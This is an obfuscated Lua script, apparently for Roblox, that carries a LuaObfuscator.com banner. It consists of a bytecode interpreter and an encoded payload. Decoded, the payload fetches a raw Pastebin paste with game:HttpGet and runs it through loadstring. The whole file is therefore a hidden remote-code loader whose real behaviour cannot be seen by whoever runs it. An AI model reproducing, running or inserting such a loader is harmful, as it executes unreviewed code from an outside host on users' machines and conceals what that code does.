--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v82=v2(v0(v30,16));if v19 then local v88=0;local v89;while true do if (v88==0) then v89=v5(v82,v19);v19=nil;v88=1;end if (v88==1) then return v89;end end else return v82;end end end);local function v20(v31,v32,v33) if v33 then local v83=(v31/((5 -3)^(v32-1)))%((5 -(1640 -(1523 + 114)))^(((v33-(1 -(0 + 0))) -(v32-(2 -1))) + 1)) ;return v83-(v83%(620 -(555 + 64))) ;else local v84=931 -(857 + 74) ;local v85;while true do if ((568 -(367 + 201))==v84) then v85=(929 -(214 + 713))^(v32-(1 + (0 -0))) ;return (((v31%(v85 + v85))>=v85) and (1 + 0)) or (877 -(282 + 595)) ;end end end end local function v21() local v34=1065 -(68 + 997) ;local v35;while true do if (v34==0) then v35=v1(v16,v18,v18);v18=v18 + (1271 -((343 -(32 + 85)) + 1044)) ;v34=4 -3 ;end if (v34==1) then return v35;end end end local function v22() local v36,v37=v1(v16,v18,v18 + 2 + 0 );v18=v18 + 1 + 1 ;return (v37 * (1213 -(892 + 65))) + v36 ;end local function v23() local v38,v39,v40,v41=v1(v16,v18,v18 + (7 -4) );v18=v18 + (184 -(67 + 113)) ;return (v41 * (31011612 -14234396)) + (v40 * (120312 -54776)) + (v39 * (606 -(87 + 193 + 70))) + v38 ;end local function v24() local v42=(0 + 0) -0 ;local v43;local v44;local v45;local v46;local v47;local v48;while true do if (v42==(1 -0)) then v45=1 + 0 ;v46=(v20(v44,3 -2 ,20) * ((954 -(802 + 150))^(85 -53))) + v43 ;v42=3 -1 ;end if (v42==(3 + 0)) then if (v47==0) then if (v46==(997 -((1353 -(145 + 293)) + (512 -(44 + 386))))) then return v48 * (0 -(1486 -(998 + 488))) ;else v47=1 + 0 + 0 ;v45=0 -0 ;end elseif (v47==2047) then return ((v46==0) and (v48 * (1/(1187 -(1069 + 97 + 21))))) or (v48 * NaN) ;end return v8(v48,v47-(2320 -1297) ) * (v45 + (v46/((3 -1)^(10 + 42)))) ;end if ((0 -0)==v42) then v43=v23();v44=v23();v42=1 + 0 ;end if (v42==(793 -(368 + 423))) then v47=v20(v44,65 -44 ,49 -(10 + (780 -(201 + 571))) );v48=((v20(v44,122 -90 )==((1581 -(116 + 1022)) -(416 + 26))) and  -(3 -2)) or 1 ;v42=3;end end end local function v25(v49) local v50=0 -0 ;local v51;local v52;while true do if (v50==(0 + 0)) then v51=nil;if  not v49 then local v96=(1747 -(760 + 987)) -0 ;while true do if ((1080 -(1020 + 60))==v96) then v49=v23();if (v49==(0 -0)) then return "";end break;end end end v50=1;end if (v50==(6 -4)) then v52={};for v90=1, #v51 do v52[v90]=v2(v1(v3(v51,v90,v90)));end v50=862 -(814 + 45) ;end if (v50==(7 -(1917 -(1789 + 124)))) then return v6(v52);end if (v50==(767 -(745 + 21))) then v51=v3(v16,v18,(v18 + v49) -(1 + 0) );v18=v18 + v49 ;v50=1 + 1 ;end end end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v53=(function() return 1581 -(1535 + 46) ;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();local v59=(function() return;end)();local v60=(function() return;end)();while true do local v67=(function() return 0 + 0 ;end)();while true do if ((2 -1)==v67) then if (v53==1) then v58=(function() return {v55,v56,nil,v57};end)();v59=(function() return v23();end)();v60=(function() return {};end)();for v100= #"<",v59 do local v101=(function() return 0;end)();local v102=(function() return;end)();local v103=(function() return;end)();while true do if (v101==(1 + 0)) then if (v102== #" ") then v103=(function() return v21()~=(560 -(306 + 254)) ;end)();elseif (v102==(398 -(115 + 281))) then v103=(function() return v24();end)();elseif (v102== #"91(") then v103=(function() return v25();end)();end v60[v100]=(function() return v103;end)();break;end if (0~=v101) then else local v117=(function() return 0 -0 ;end)();local v118=(function() return;end)();while true do if (v117~=(0 + 0)) then else v118=(function() return 0 -0 ;end)();while true do if ((1468 -(899 + 568))~=v118) then else v101=(function() return 1 + 0 ;end)();break;end if (v118==(0 -0)) then v102=(function() return v21();end)();v103=(function() return nil;end)();v118=(function() return 3 -2 ;end)();end end break;end end end end end v53=(function() return 869 -(550 + 317) ;end)();end break;end if (v67==0) then if ((290 -(60 + 230))~=v53) then else v54=(function() return function(v107,v108,v109) local v110=(function() return 0;end)();while true do if (v110==(0 -0)) then local v119=(function() return 0 -0 ;end)();while true do if (v119==(0 -0)) then v107[v108-#"," ]=(function() return v109();end)();return v107,v108,v109;end end end end end;end)();v55=(function() return {};end)();v56=(function() return {};end)();v57=(function() return {};end)();v53=(function() return 1;end)();end if (v53~=2) then else v58[ #"-19"]=(function() return v21();end)();for v104= #"/",v23() do local v105=(function() return v21();end)();if (v20(v105, #"[", #"<")==(285 -(134 + 151))) then local v111=(function() return 0;end)();local v112=(function() return;end)();local v113=(function() return;end)();local v114=(function() return;end)();local v115=(function() return;end)();while true do if (v111~=(1666 -(970 + 695))) then else local v152=(function() return 0 + 0 ;end)();while true do if (v152==(1 -0)) then v111=(function() return 1992 -(582 + 1408) ;end)();break;end if (v152==0) then v114=(function() return nil;end)();v115=(function() return nil;end)();v152=(function() return 3 -2 ;end)();end end end if (v111==(0 -0)) then v112=(function() return 0 -0 ;end)();v113=(function() return nil;end)();v111=(function() return 1;end)();end if (v111==(1826 -(1195 + 629))) then while true do if (v112~= #"|") then else local v165=(function() return 0 -0 ;end)();local v166=(function() return;end)();while true do if (v165==0) then v166=(function() return 241 -(187 + 54) ;end)();while true do if ((780 -(162 + 618))==v166) then v115=(function() return {v22(),v22(),nil,nil};end)();if (v113==(700 -(271 + 429))) then local v179=(function() return 0 + 0 ;end)();local v180=(function() return;end)();while true do if (v179==(1500 -(1408 + 92))) then v180=(function() return 0 -0 ;end)();while true do if (v180~=0) then else v115[ #"xnx"]=(function() return v22();end)();v115[ #"http"]=(function() return v22();end)();break;end end break;end end elseif (v113== #"]") then v115[ #"91("]=(function() return v23();end)();elseif (v113==2) then v115[ #"19("]=(function() return v23() -((1088 -(461 + 625))^(26 -10)) ;end)();elseif (v113== #"19(") then local v187=(function() return 0;end)();while true do if (v187==0) then v115[ #"xxx"]=(function() return v23() -((1 + 1)^(1652 -(1373 + 263))) ;end)();v115[ #"http"]=(function() return v22();end)();break;end end end v166=(function() return 1;end)();end if (v166~=(1289 -(993 + 295))) then else v112=(function() return 2;end)();break;end end break;end end end if (v112~=(1002 -(451 + 549))) then else local v167=(function() return 0 + 0 ;end)();local v168=(function() return;end)();while true do if (v167~=0) then else v168=(function() return 0 -0 ;end)();while true do if (v168==(1172 -(418 + 753))) then v112=(function() return  #"asd";end)();break;end if (v168~=(0 -0)) then else if (v20(v114, #"}", #">")== #"~") then v115[2]=(function() return v60[v115[2]];end)();end if (v20(v114,1 + 1 ,1386 -(746 + 638) )== #" ") then v115[ #"nil"]=(function() return v60[v115[ #"91("]];end)();end v168=(function() return 1;end)();end end break;end end end if ( #"19("==v112) then if (v20(v114, #"asd", #"asd")== #"{") then v115[ #"http"]=(function() return v60[v115[ #"0313"]];end)();end v55[v104]=(function() return v115;end)();break;end if (v112==0) then local v170=(function() return 0 + 0 ;end)();local v171=(function() return;end)();while true do if (v170~=(0 + 0)) then else v171=(function() return 0;end)();while true do if (v171==(1 + 0)) then v112=(function() return  #" ";end)();break;end if ((0 + 0)==v171) then v113=(function() return v20(v105,531 -(406 + 123) , #"-19");end)();v114=(function() return v20(v105, #".com",8 -2 );end)();v171=(function() return 342 -(218 + 123) ;end)();end end break;end end end end break;end end end end for v106= #">",v23() do v56,v106,v28=(function() return v54(v56,v106,v28);end)();end return v58;end v67=(function() return 1;end)();end end end end local function v29(v61,v62,v63) local v64=v61[1 + 0 ];local v65=v61[1324 -((2707 -1458) + 73) ];local v66=v61[2 + 1 ];return function(...) local v68=v64;local v69=v65;local v70=v66;local v71=v27;local v72=1146 -(466 + 679) ;local v73= -(2 -1);local v74={};local v75={...};local v76=v12("#",...) -(1901 -(106 + 1794)) ;local v77={};local v78={};for v86=(0 -0) + 0 ,v76 do if (v86>=v70) then v74[v86-v70 ]=v75[v86 + 1 + 0 ];else v78[v86]=v75[v86 + (2 -1) ];end end local v79=(v76-v70) + (2 -1) ;local v80;local v81;while true do local v87=(34 + 80) -(4 + 110) ;while true do if (v87==(584 -(57 + 527))) then v80=v68[v72];v81=v80[1428 -(41 + 1386) ];v87=104 -(17 + 86) ;end if ((2994>858) and (v87==(1 + 0))) then if (v81<=(6 -3)) then if (v81<=((9 -7) -1)) then if ((v81>(166 -(122 + 44))) or (3755<=915)) then do return;end else local v120=0 -0 ;local v121;local v122;local v123;local v124;while true do if (v120==(754 -(239 + 514))) then v73=(v123 + v121) -(3 -(1 + 1)) ;v124=0 + (1329 -(797 + 532)) ;v120=1 + 1 ;end if (v120==((0 + 0) -0)) then v121=v80[67 -(30 + 35) ];v122,v123=v71(v78[v121](v13(v78,v121 + 1 + 0 ,v80[1260 -(1043 + 214) ])));v120=3 -2 ;end if ((3946>3743) and (v120==(1214 -(323 + 889)))) then for v172=v121,v73 do local v173=0 -0 ;while true do if (v173==(580 -(361 + 219))) then v124=v124 + (321 -(53 + 267)) ;v78[v172]=v122[v124];break;end end end break;end end end elseif ((v81>(1 + 1)) or (1335>=3306)) then v78[v80[415 -(15 + 135 + 263) ]]();else local v125;local v126,v127;local v128;local v129;v78[v80[984 -(18 + 964) ]]={};v72=v72 + (3 -2) ;v80=v68[v72];v78[v80[2]]=v63[v80[3]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2 + 0 ]]=v63[v80[2 + 1 ]];v72=v72 + (851 -(20 + 830)) ;v80=v68[v72];v129=v80[2 + 0 ];v128=v78[v80[6 -3 ]];v78[v129 + 1 ]=v128;v78[v129]=v128[v80[130 -(116 + 10) ]];v72=v72 + (1203 -(373 + 829)) + 0 ;v80=v68[v72];v78[v80[740 -(542 + 196) ]]=v80[(737 -(476 + 255)) -3 ];v72=v72 + 1 ;v80=v68[v72];v129=v80[2];v126,v127=v71(v78[v129](v13(v78,v129 + 1 ,v80[1 + 2 ])));v73=(v127 + v129) -(1 + 0) ;v125=0;for v153=v129,v73 do local v154=0 + 0 ;while true do if ((4844>2253) and (v154==(0 -0))) then v125=v125 + (2 -1) ;v78[v153]=v126[v125];break;end end end v72=v72 + (1552 -(1126 + 425)) ;v80=v68[v72];v129=v80[407 -(118 + 287) ];v78[v129]=v78[v129](v13(v78,v129 + 1 ,v73));v72=v72 + ((1133 -(369 + 761)) -(2 + 0)) ;v80=v68[v72];v78[v80[1123 -(118 + 1003) ]]();v72=v72 + (2 -1) ;v80=v68[v72];do return;end end elseif (v81<=5) then if (v81>4) then v78[v80[2]]=v63[v80[380 -(142 + (426 -191)) ]];else local v147=v80[2];v78[v147]=v78[v147](v13(v78,v147 + 1 ,v73));end elseif (v81<=(27 -21)) then local v149=0 -0 ;local v150;local v151;while true do if (v149==(0 + (238 -(64 + 174)))) then v150=v80[2];v151=v78[v80[3]];v149=978 -(79 + 474 + 424) ;end if (v149==(1 -0)) then v78[v150 + (1 -0) + 0 ]=v151;v78[v150]=v151[v80[(340 -(144 + 192)) + (216 -(42 + 174)) ]];break;end end elseif (v81==7) then v78[v80[2]]=v80[2 + 1 ];else v78[v80[1 + 1 ]]={};end v72=v72 + 1 + 0 ;break;end end end end;end return v29(v28(),{},v17)(...);end return v15("LOL!043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403213Q00682Q7470733A2Q2F706173746562696E2E636F6D2F7261772F58636E4A5557624C00094Q00027Q00122Q000100013Q00122Q000200023Q00202Q00020002000300122Q000400046Q000200046Q00013Q00024Q0001000100016Q00017Q00",v9(),...);
